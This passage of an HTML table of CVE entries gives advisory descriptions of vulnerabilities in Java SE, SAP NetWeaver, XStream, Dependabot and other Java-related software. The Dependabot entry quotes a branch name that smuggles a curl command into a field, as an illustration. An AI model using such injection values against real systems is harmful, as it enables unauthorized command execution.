		<td valign="top">Vulnerability in the Java SE, Java SE Embedded product of Oracle Java SE (component: Concurrency). Supported versions that are affected are Java SE: 7u251, 8u241, 11.0.6 and 14; Java SE Embedded: 8u241. Easily exploitable vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE, Java SE Embedded. Successful attacks of this vulnerability can result in unauthorized ability to cause a partial denial of service (partial DOS) of Java SE, Java SE Embedded. Note: Applies to client and server deployment of Java. This vulnerability can be exploited through sandboxed Java Web Start applications and sandboxed Java applets. It can also be exploited by supplying data to APIs in the specified Component without using sandboxed Java Web Start applications or sandboxed Java applets, such as through a web service. CVSS 3.0 Base Score 5.3 (Availability impacts). CVSS Vector: (CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2020-2816">CVE-2020-2816</a></td>
		<td valign="top">Vulnerability in the Java SE product of Oracle Java SE (component: JSSE). Supported versions that are affected are Java SE: 11.0.6 and 14. Easily exploitable vulnerability allows unauthenticated attacker with network access via HTTPS to compromise Java SE. Successful attacks of this vulnerability can result in unauthorized creation, deletion or modification access to critical data or all Java SE accessible data. Note: This vulnerability can only be exploited by supplying data to APIs in the specified Component without using Untrusted Java Web Start applications or Untrusted Java applets, such as through a web service. CVSS 3.0 Base Score 7.5 (Integrity impacts). CVSS Vector: (CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2020-28052">CVE-2020-28052</a></td>
		<td valign="top">An issue was discovered in Legion of the Bouncy Castle BC Java 1.65 and 1.66. The OpenBSDBCrypt.checkPassword utility method compared incorrect data when checking the password, allowing incorrect passwords to indicate they were matching with previously hashed ones that were different.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2020-2805">CVE-2020-2805</a></td>
		<td valign="top">Vulnerability in the Java SE, Java SE Embedded product of Oracle Java SE (component: Libraries). Supported versions that are affected are Java SE: 7u251, 8u241, 11.0.6 and 14; Java SE Embedded: 8u241. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE, Java SE Embedded. Successful attacks require human interaction from a person other than the attacker and while the vulnerability is in Java SE, Java SE Embedded, attacks may significantly impact additional products. Successful attacks of this vulnerability can result in takeover of Java SE, Java SE Embedded. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability does not apply to Java deployments, typically in servers, that load and run only trusted code (e.g., code installed by an administrator). CVSS 3.0 Base Score 8.3 (Confidentiality, Integrity and Availability impacts). CVSS Vector: (CVSS:3.0/AV:N/AC:H/PR:N/UI:R/S:C/C:H/I:H/A:H).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2020-2803">CVE-2020-2803</a></td>
		<td valign="top">Vulnerability in the Java SE, Java SE Embedded product of Oracle Java SE (component: Libraries). Supported versions that are affected are Java SE: 7u251, 8u241, 11.0.6 and 14; Java SE Embedded: 8u241. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE, Java SE Embedded. Successful attacks require human interaction from a person other than the attacker and while the vulnerability is in Java SE, Java SE Embedded, attacks may significantly impact additional products. Successful attacks of this vulnerability can result in takeover of Java SE, Java SE Embedded. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability does not apply to Java deployments, typically in servers, that load and run only trusted code (e.g., code installed by an administrator). CVSS 3.0 Base Score 8.3 (Confidentiality, Integrity and Availability impacts). CVSS Vector: (CVSS:3.0/AV:N/AC:H/PR:N/UI:R/S:C/C:H/I:H/A:H).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2020-2800">CVE-2020-2800</a></td>
		<td valign="top">Vulnerability in the Java SE, Java SE Embedded product of Oracle Java SE (component: Lightweight HTTP Server). Supported versions that are affected are Java SE: 7u251, 8u241, 11.0.6 and 14; Java SE Embedded: 8u241. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE, Java SE Embedded. Successful attacks of this vulnerability can result in unauthorized update, insert or delete access to some of Java SE, Java SE Embedded accessible data as well as unauthorized read access to a subset of Java SE, Java SE Embedded accessible data. Note: This vulnerability can only be exploited by supplying data to APIs in the specified Component without using Untrusted Java Web Start applications or Untrusted Java applets, such as through a web service. CVSS 3.0 Base Score 4.8 (Confidentiality and Integrity impacts). CVSS Vector: (CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:N).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2020-27978">CVE-2020-27978</a></td>
		<td valign="top">Shibboleth Identify Provider 3.x before 3.4.6 has a denial of service flaw. A remote unauthenticated attacker can cause a login flow to trigger Java heap exhaustion due to the creation of objects in the Java Servlet container session.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2020-27822">CVE-2020-27822</a></td>
		<td valign="top">A flaw was found in Wildfly affecting versions 19.0.0.Final, 19.1.0.Final, 20.0.0.Final, 20.0.1.Final, and 21.0.0.Final. When an application uses the OpenTracing API's java-interceptors, there is a possibility of a memory leak. This flaw allows an attacker to impact the availability of the server. The highest threat from this vulnerability is to system availability.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2020-2781">CVE-2020-2781</a></td>
		<td valign="top">Vulnerability in the Java SE, Java SE Embedded product of Oracle Java SE (component: JSSE). Supported versions that are affected are Java SE: 7u251, 8u241, 11.0.6 and 14; Java SE Embedded: 8u241. Easily exploitable vulnerability allows unauthenticated attacker with network access via HTTPS to compromise Java SE, Java SE Embedded. Successful attacks of this vulnerability can result in unauthorized ability to cause a partial denial of service (partial DOS) of Java SE, Java SE Embedded. Note: Applies to client and server deployment of Java. This vulnerability can be exploited through sandboxed Java Web Start applications and sandboxed Java applets. It can also be exploited by supplying data to APIs in the specified Component without using sandboxed Java Web Start applications or sandboxed Java applets, such as through a web service. CVSS 3.0 Base Score 5.3 (Availability impacts). CVSS Vector: (CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2020-2778">CVE-2020-2778</a></td>
		<td valign="top">Vulnerability in the Java SE product of Oracle Java SE (component: JSSE). Supported versions that are affected are Java SE: 11.0.6 and 14. Difficult to exploit vulnerability allows unauthenticated attacker with network access via HTTPS to compromise Java SE. Successful attacks of this vulnerability can result in unauthorized read access to a subset of Java SE accessible data. Note: Applies to client and server deployment of Java. This vulnerability can be exploited through sandboxed Java Web Start applications and sandboxed Java applets. It can also be exploited by supplying data to APIs in the specified Component without using sandboxed Java Web Start applications or sandboxed Java applets, such as through a web service. CVSS 3.0 Base Score 3.7 (Confidentiality impacts). CVSS Vector: (CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2020-2773">CVE-2020-2773</a></td>
		<td valign="top">Vulnerability in the Java SE, Java SE Embedded product of Oracle Java SE (component: Security). Supported versions that are affected are Java SE: 7u251, 8u241, 11.0.6 and 14; Java SE Embedded: 8u241. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE, Java SE Embedded. Successful attacks of this vulnerability can result in unauthorized ability to cause a partial denial of service (partial DOS) of Java SE, Java SE Embedded. Note: Applies to client and server deployment of Java. This vulnerability can be exploited through sandboxed Java Web Start applications and sandboxed Java applets. It can also be exploited by supplying data to APIs in the specified Component without using sandboxed Java Web Start applications or sandboxed Java applets, such as through a web service. CVSS 3.0 Base Score 3.7 (Availability impacts). CVSS Vector: (CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2020-2767">CVE-2020-2767</a></td>
		<td valign="top">Vulnerability in the Java SE product of Oracle Java SE (component: JSSE). Supported versions that are affected are Java SE: 11.0.6 and 14. Difficult to exploit vulnerability allows unauthenticated attacker with network access via HTTPS to compromise Java SE. Successful attacks of this vulnerability can result in unauthorized update, insert or delete access to some of Java SE accessible data as well as unauthorized read access to a subset of Java SE accessible data. Note: Applies to client and server deployment of Java. This vulnerability can be exploited through sandboxed Java Web Start applications and sandboxed Java applets. It can also be exploited by supplying data to APIs in the specified Component without using sandboxed Java Web Start applications or sandboxed Java applets, such as through a web service. CVSS 3.0 Base Score 4.8 (Confidentiality and Integrity impacts). CVSS Vector: (CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:N).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2020-2764">CVE-2020-2764</a></td>
		<td valign="top">Vulnerability in the Java SE product of Oracle Java SE (component: Advanced Management Console). The supported version that is affected is Java Advanced Management Console: 2.16. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE. Successful attacks of this vulnerability can result in unauthorized read access to a subset of Java SE accessible data. Note: This vulnerability can only be exploited by supplying data to APIs in the specified Component without using Untrusted Java Web Start applications or Untrusted Java applets, such as through a web service. CVSS 3.0 Base Score 3.7 (Confidentiality impacts). CVSS Vector: (CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2020-2757">CVE-2020-2757</a></td>
		<td valign="top">Vulnerability in the Java SE, Java SE Embedded product of Oracle Java SE (component: Serialization). Supported versions that are affected are Java SE: 7u251, 8u241, 11.0.6 and 14; Java SE Embedded: 8u241. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE, Java SE Embedded. Successful attacks of this vulnerability can result in unauthorized ability to cause a partial denial of service (partial DOS) of Java SE, Java SE Embedded. Note: Applies to client and server deployment of Java. This vulnerability can be exploited through sandboxed Java Web Start applications and sandboxed Java applets. It can also be exploited by supplying data to APIs in the specified Component without using sandboxed Java Web Start applications or sandboxed Java applets, such as through a web service. CVSS 3.0 Base Score 3.7 (Availability impacts). CVSS Vector: (CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2020-2756">CVE-2020-2756</a></td>
		<td valign="top">Vulnerability in the Java SE, Java SE Embedded product of Oracle Java SE (component: Serialization). Supported versions that are affected are Java SE: 7u251, 8u241, 11.0.6 and 14; Java SE Embedded: 8u241. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE, Java SE Embedded. Successful attacks of this vulnerability can result in unauthorized ability to cause a partial denial of service (partial DOS) of Java SE, Java SE Embedded. Note: Applies to client and server deployment of Java. This vulnerability can be exploited through sandboxed Java Web Start applications and sandboxed Java applets. It can also be exploited by supplying data to APIs in the specified Component without using sandboxed Java Web Start applications or sandboxed Java applets, such as through a web service. CVSS 3.0 Base Score 3.7 (Availability impacts). CVSS Vector: (CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2020-2755">CVE-2020-2755</a></td>
		<td valign="top">Vulnerability in the Java SE, Java SE Embedded product of Oracle Java SE (component: Scripting). Supported versions that are affected are Java SE: 8u241, 11.0.6 and 14; Java SE Embedded: 8u241. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE, Java SE Embedded. Successful attacks of this vulnerability can result in unauthorized ability to cause a partial denial of service (partial DOS) of Java SE, Java SE Embedded. Note: Applies to client and server deployment of Java. This vulnerability can be exploited through sandboxed Java Web Start applications and sandboxed Java applets. It can also be exploited by supplying data to APIs in the specified Component without using sandboxed Java Web Start applications or sandboxed Java applets, such as through a web service. CVSS 3.0 Base Score 3.7 (Availability impacts). CVSS Vector: (CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2020-2754">CVE-2020-2754</a></td>
		<td valign="top">Vulnerability in the Java SE, Java SE Embedded product of Oracle Java SE (component: Scripting). Supported versions that are affected are Java SE: 8u241, 11.0.6 and 14; Java SE Embedded: 8u241. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE, Java SE Embedded. Successful attacks of this vulnerability can result in unauthorized ability to cause a partial denial of service (partial DOS) of Java SE, Java SE Embedded. Note: Applies to client and server deployment of Java. This vulnerability can be exploited through sandboxed Java Web Start applications and sandboxed Java applets. It can also be exploited by supplying data to APIs in the specified Component without using sandboxed Java Web Start applications or sandboxed Java applets, such as through a web service. CVSS 3.0 Base Score 3.7 (Availability impacts). CVSS Vector: (CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2020-2735">CVE-2020-2735</a></td>
		<td valign="top">Vulnerability in the Java VM component of Oracle Database Server. Supported versions that are affected are 11.2.0.4, 12.1.0.2, 12.2.0.1, 18c and 19c. Difficult to exploit vulnerability allows low privileged attacker having Create Session privilege with network access via Oracle Net to compromise Java VM. Successful attacks require human interaction from a person other than the attacker and while the vulnerability is in Java VM, attacks may significantly impact additional products. Successful attacks of this vulnerability can result in takeover of Java VM. CVSS 3.0 Base Score 8.0 (Confidentiality, Integrity and Availability impacts). CVSS Vector: (CVSS:3.0/AV:N/AC:H/PR:L/UI:R/S:C/C:H/I:H/A:H).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2020-27181">CVE-2020-27181</a></td>
		<td valign="top">A hardcoded AES key in CipherUtils.java in the Java applet of konzept-ix publiXone before 2020.015 allows attackers to craft password-reset tokens or decrypt server-side configuration files.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2020-27131">CVE-2020-27131</a></td>
		<td valign="top">Multiple vulnerabilities in the Java deserialization function that is used by Cisco Security Manager could allow an unauthenticated, remote attacker to execute arbitrary commands on an affected device. These vulnerabilities are due to insecure deserialization of user-supplied content by the affected software. An attacker could exploit these vulnerabilities by sending a malicious serialized Java object to a specific listener on an affected system. A successful exploit could allow the attacker to execute arbitrary commands on the device with the privileges of NT AUTHORITY\SYSTEM on the Windows target host. Cisco has not released software updates that address these vulnerabilities.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2020-26829">CVE-2020-26829</a></td>
		<td valign="top">SAP NetWeaver AS JAVA (P2P Cluster Communication), versions - 7.11, 7.20, 7.30, 7.31, 7.40, 7.50, allows arbitrary connections from processes because of missing authentication check, that are outside the cluster and even outside the network segment dedicated for the internal cluster communication. As result, an unauthenticated attacker can invoke certain functions that would otherwise be restricted to system administrators only, including access to system administration functions or shutting down the system completely.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2020-26826">CVE-2020-26826</a></td>
		<td valign="top">Process Integration Monitoring of SAP NetWeaver AS JAVA, versions - 7.31, 7.40, 7.50, allows an attacker to upload any file (including script files) without proper file format validation, leading to Unrestricted File Upload.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2020-26824">CVE-2020-26824</a></td>
		<td valign="top">SAP Solution Manager (JAVA stack), version - 7.20, allows an unauthenticated attacker to compromise the system because of missing authorization checks in the Upgrade Legacy Ports Service, this has an impact to the integrity and availability of the service.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2020-26823">CVE-2020-26823</a></td>
		<td valign="top">SAP Solution Manager (JAVA stack), version - 7.20, allows an unauthenticated attacker to compromise the system because of missing authorization checks in the Upgrade Diagnostics Agent Connection Service, this has an impact to the integrity and availability of the service.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2020-26822">CVE-2020-26822</a></td>
		<td valign="top">SAP Solution Manager (JAVA stack), version - 7.20, allows an unauthenticated attacker to compromise the system because of missing authorization checks in the Outside Discovery Configuration Service, this has an impact to the integrity and availability of the service.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2020-26821">CVE-2020-26821</a></td>
		<td valign="top">SAP Solution Manager (JAVA stack), version - 7.20, allows an unauthenticated attacker to compromise the system because of missing authorization checks in the SVG Converter Service, this has an impact to the integrity and availability of the service.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2020-26820">CVE-2020-26820</a></td>
		<td valign="top">SAP NetWeaver AS JAVA, versions - 7.20, 7.30, 7.31, 7.40, 7.50, allows an attacker who is authenticated as an administrator to use the administrator console, to expose unauthenticated access to the file system and upload a malicious file. The attacker or another user can then use a separate mechanism to execute OS commands through the uploaded file leading to Privilege Escalation and completely compromise the confidentiality, integrity and availability of the server operating system and any application running on it.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2020-26816">CVE-2020-26816</a></td>
		<td valign="top">SAP AS JAVA (Key Storage Service), versions - 7.10, 7.11, 7.20 ,7.30, 7.31, 7.40, 7.50, has the key material which is stored in the SAP NetWeaver AS Java Key Storage service stored in the database in the DER encoded format and is not encrypted. This enables an attacker who has administrator access to the SAP NetWeaver AS Java to decode the keys because of missing encryption and get some application data and client credentials of adjacent systems. This highly impacts Confidentiality as information disclosed could contain client credentials of adjacent systems.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2020-2659">CVE-2020-2659</a></td>
		<td valign="top">Vulnerability in the Java SE, Java SE Embedded product of Oracle Java SE (component: Networking). Supported versions that are affected are Java SE: 7u241 and 8u231; Java SE Embedded: 8u231. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE, Java SE Embedded. Successful attacks of this vulnerability can result in unauthorized ability to cause a partial denial of service (partial DOS) of Java SE, Java SE Embedded. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets (in Java SE 8), that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability can also be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. CVSS 3.0 Base Score 3.7 (Availability impacts). CVSS Vector: (CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2020-2655">CVE-2020-2655</a></td>
		<td valign="top">Vulnerability in the Java SE product of Oracle Java SE (component: JSSE). Supported versions that are affected are Java SE: 11.0.5 and 13.0.1. Difficult to exploit vulnerability allows unauthenticated attacker with network access via HTTPS to compromise Java SE. Successful attacks of this vulnerability can result in unauthorized update, insert or delete access to some of Java SE accessible data as well as unauthorized read access to a subset of Java SE accessible data. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets (in Java SE 8), that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability can also be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. CVSS 3.0 Base Score 4.8 (Confidentiality and Integrity impacts). CVSS Vector: (CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:N).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2020-2654">CVE-2020-2654</a></td>
		<td valign="top">Vulnerability in the Java SE product of Oracle Java SE (component: Libraries). Supported versions that are affected are Java SE: 7u241, 8u231, 11.0.5 and 13.0.1. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE. Successful attacks of this vulnerability can result in unauthorized ability to cause a partial denial of service (partial DOS) of Java SE. Note: This vulnerability can only be exploited by supplying data to APIs in the specified Component without using Untrusted Java Web Start applications or Untrusted Java applets, such as through a web service. CVSS 3.0 Base Score 3.7 (Availability impacts). CVSS Vector: (CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2020-26282">CVE-2020-26282</a></td>
		<td valign="top">BrowserUp Proxy allows you to manipulate HTTP requests and responses, capture HTTP content, and export performance data as a HAR file. BrowserUp Proxy works well as a standalone proxy server, but it is especially useful when embedded in Selenium tests. A Server-Side Template Injection was identified in BrowserUp Proxy enabling attackers to inject arbitrary Java EL expressions, leading to unauthenticated Remote Code Execution (RCE) vulnerability. This has been patched in version 2.1.2.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2020-26259">CVE-2020-26259</a></td>
		<td valign="top">XStream is a Java library to serialize objects to XML and back again. In XStream before version 1.4.15, is vulnerable to an Arbitrary File Deletion on the local host when unmarshalling. The vulnerability may allow a remote attacker to delete arbitrary know files on the host as log as the executing process has sufficient rights only by manipulating the processed input stream. If you rely on XStream's default blacklist of the Security Framework, you will have to use at least version 1.4.15. The reported vulnerability does not exist running Java 15 or higher. No user is affected, who followed the recommendation to setup XStream's Security Framework with a whitelist! Anyone relying on XStream's default blacklist can immediately switch to a whilelist for the allowed types to avoid the vulnerability. Users of XStream 1.4.14 or below who still want to use XStream default blacklist can use a workaround described in more detailed in the referenced advisories.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2020-26258">CVE-2020-26258</a></td>
		<td valign="top">XStream is a Java library to serialize objects to XML and back again. In XStream before version 1.4.15, a Server-Side Forgery Request vulnerability can be activated when unmarshalling. The vulnerability may allow a remote attacker to request data from internal resources that are not publicly available only by manipulating the processed input stream. If you rely on XStream's default blacklist of the Security Framework, you will have to use at least version 1.4.15. The reported vulnerability does not exist if running Java 15 or higher. No user is affected who followed the recommendation to setup XStream's Security Framework with a whitelist! Anyone relying on XStream's default blacklist can immediately switch to a whilelist for the allowed types to avoid the vulnerability. Users of XStream 1.4.14 or below who still want to use XStream default blacklist can use a workaround described in more detailed in the referenced advisories.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2020-26238">CVE-2020-26238</a></td>
		<td valign="top">Cron-utils is a Java library to parse, validate, migrate crons as well as get human readable descriptions for them. In cron-utils before version 9.1.3, a template Injection vulnerability is present. This enables attackers to inject arbitrary Java EL expressions, leading to unauthenticated Remote Code Execution (RCE) vulnerability. Only projects using the @Cron annotation to validate untrusted Cron expressions are affected. This issue was patched in version 9.1.3.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2020-26234">CVE-2020-26234</a></td>
		<td valign="top">Opencast before versions 8.9 and 7.9 disables HTTPS hostname verification of its HTTP client used for a large portion of Opencast's HTTP requests. Hostname verification is an important part when using HTTPS to ensure that the presented certificate is valid for the host. Disabling it can allow for man-in-the-middle attacks. This problem is fixed in Opencast 7.9 and Opencast 8.8 Please be aware that fixing the problem means that Opencast will not simply accept any self-signed certificates any longer without properly importing them. If you need those, please make sure to import them into the Java key store. Better yet, get a valid certificate.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2020-26222">CVE-2020-26222</a></td>
		<td valign="top">Dependabot is a set of packages for automated dependency management for Ruby, JavaScript, Python, PHP, Elixir, Rust, Java, .NET, Elm and Go. In Dependabot-Core from version 0.119.0.beta1 before version 0.125.1, there is a remote code execution vulnerability in dependabot-common and dependabot-go_modules when a source branch name contains malicious injectable bash code. For example, if Dependabot is configured to use the following source branch name: "/$({curl,127.0.0.1})", Dependabot will make a HTTP request to the following URL: 127.0.0.1 when cloning the source repository. The fix was applied to version 0.125.1. As a workaround, one can escape the branch name prior to passing it to the Dependabot::Source class.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2020-26118">CVE-2020-26118</a></td>
		<td valign="top">In SmartBear Collaborator Server through 13.3.13302, use of the Google Web Toolkit (GWT) API introduces a post-authentication Java deserialization vulnerability. The application's UpdateMemento class accepts a serialized Java object directly from the user without properly sanitizing it. A malicious object can be submitted to the server via an authenticated attacker to execute commands on the underlying system.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2020-2604">CVE-2020-2604</a></td>
		<td valign="top">Vulnerability in the Java SE, Java SE Embedded product of Oracle Java SE (component: Serialization). Supported versions that are affected are Java SE: 7u241, 8u231, 11.0.5 and 13.0.1; Java SE Embedded: 8u231. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE, Java SE Embedded. Successful attacks of this vulnerability can result in takeover of Java SE, Java SE Embedded. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets (in Java SE 8), that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability can also be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. CVSS v3.0 Base Score 8.1 (Confidentiality, Integrity and Availability impacts). CVSS Vector: (CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2020-2601">CVE-2020-2601</a></td>
		<td valign="top">Vulnerability in the Java SE, Java SE Embedded product of Oracle Java SE (component: Security). Supported versions that are affected are Java SE: 7u241, 8u231, 11.0.5 and 13.0.1; Java SE Embedded: 8u231. Difficult to exploit vulnerability allows unauthenticated attacker with network access via Kerberos to compromise Java SE, Java SE Embedded. While the vulnerability is in Java SE, Java SE Embedded, attacks may significantly impact additional products. Successful attacks of this vulnerability can result in unauthorized access to critical data or complete access to all Java SE, Java SE Embedded accessible data. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets (in Java SE 8), that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability can also be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. CVSS 3.0 Base Score 6.8 (Confidentiality impacts). CVSS Vector: (CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:N/A:N).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2020-2593">CVE-2020-2593</a></td>
		<td valign="top">Vulnerability in the Java SE, Java SE Embedded product of Oracle Java SE (component: Networking). Supported versions that are affected are Java SE: 7u241, 8u231, 11.0.5 and 13.0.1; Java SE Embedded: 8u231. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE, Java SE Embedded. Successful attacks of this vulnerability can result in unauthorized update, insert or delete access to some of Java SE, Java SE Embedded accessible data as well as unauthorized read access to a subset of Java SE, Java SE Embedded accessible data. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets (in Java SE 8), that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability can also be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. CVSS 3.0 Base Score 4.8 (Confidentiality and Integrity impacts). CVSS Vector: (CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:N).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2020-2590">CVE-2020-2590</a></td>
